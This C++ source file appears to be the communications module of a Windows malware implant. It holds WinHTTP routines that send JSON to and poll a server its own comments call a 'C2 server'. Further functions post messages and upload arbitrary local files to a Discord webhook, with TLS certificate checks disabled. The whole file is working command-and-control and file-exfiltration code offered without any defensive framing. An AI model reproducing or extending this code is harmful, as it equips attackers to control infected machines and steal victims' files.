#include "comms.h"
#include "config.h"
#include "utils.h"
#include <windows.h>
#include <winhttp.h>
#include <vector>
#include <fstream>
#include <cstdio>

// ===================== WinHTTP Helpers =====================

static HINTERNET g_session = nullptr;

static void init_session() {
    if (!g_session) {
        g_session = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                WINHTTP_NO_PROXY_NAME,
                                WINHTTP_NO_PROXY_BYPASS, 0);
    }
}

// Generic HTTP request to C2 server
static std::string winhttp_request(const wchar_t* method, const wchar_t* host, int port,
                                    const std::wstring& path, const std::string& body,
                                    bool use_https) {
    init_session();
    if (!g_session) return "";
    
    HINTERNET hConnect = WinHttpConnect(g_session, host, port, 0);
    if (!hConnect) return "";
    
    DWORD flags = use_https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, method, path.c_str(),
                                            nullptr, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) { WinHttpCloseHandle(hConnect); return ""; }
    
    // For HTTPS, ignore certificate errors (self-signed / Discord)
    if (use_https) {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
    }
    
    const wchar_t* headers = L"Content-Type: application/json\r\n";
    BOOL sent = WinHttpSendRequest(hRequest, headers, -1,
                                    (LPVOID)body.c_str(), (DWORD)body.length(),
                                    (DWORD)body.length(), 0);
    
    std::string response;
    if (sent && WinHttpReceiveResponse(hRequest, nullptr)) {
        char buf[4096];
        DWORD bytesRead = 0;
        while (WinHttpReadData(hRequest, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {
            response.append(buf, bytesRead);
            bytesRead = 0;
        }
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    return response;
}

// ===================== C2 Communication =====================

std::string http_post_json(const std::string& path, const std::string& json_body) {
    return winhttp_request(L"POST", C2_HOST, C2_PORT, to_wide(path), json_body, false);
}

std::string http_get(const std::string& path) {
    return winhttp_request(L"GET", C2_HOST, C2_PORT, to_wide(path), "", false);
}

// ===================== Discord Webhook =====================

bool discord_send(const std::string& text_content) {
    std::string body = "{\"content\":\"" + json_escape(text_content) + "\"}";
    std::string resp = winhttp_request(L"POST", DISCORD_HOST, 443,
                                        DISCORD_PATH, body, true);
    return !resp.empty() || true; // Discord returns empty on success (204 No Content)
}

bool discord_upload_file(const std::string& filepath, const std::string& message) {
    // Read file
    std::ifstream file(filepath, std::ios::binary);
    if (!file.is_open()) return false;
    std::vector<char> file_data((std::istreambuf_iterator<char>(file)),
                                 std::istreambuf_iterator<char>());
    file.close();
    
    // Extract filename
    std::string filename = filepath;
    size_t pos = filename.find_last_of("\\/");
    if (pos != std::string::npos) filename = filename.substr(pos + 1);
    
    // Build multipart/form-data
    std::string boundary = "----FsocietyBoundary9876543210";
    std::string body;
    
    // JSON payload_json part (message content)
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"payload_json\"\r\n";
    body += "Content-Type: application/json\r\n\r\n";
    body += "{\"content\":\"" + json_escape(message) + "\"}\r\n";
    
    // File part
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" + filename + "\"\r\n";
    body += "Content-Type: application/octet-stream\r\n\r\n";
    body.append(file_data.begin(), file_data.end());
    body += "\r\n--" + boundary + "--\r\n";
    
    // Send with multipart content type
    init_session();
    if (!g_session) return false;
    
    HINTERNET hConnect = WinHttpConnect(g_session, DISCORD_HOST, 443, 0);
    if (!hConnect) return false;
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", DISCORD_PATH,
                                            nullptr, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); return false; }
    
    DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                      SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                      SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
    
    std::wstring content_type = L"Content-Type: multipart/form-data; boundary=" + to_wide(boundary) + L"\r\n";
    
    BOOL sent = WinHttpSendRequest(hRequest, content_type.c_str(), -1,
                                    (LPVOID)body.c_str(), (DWORD)body.length(),
                                    (DWORD)body.length(), 0);
    
    bool ok = sent && WinHttpReceiveResponse(hRequest, nullptr);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    return ok;
}
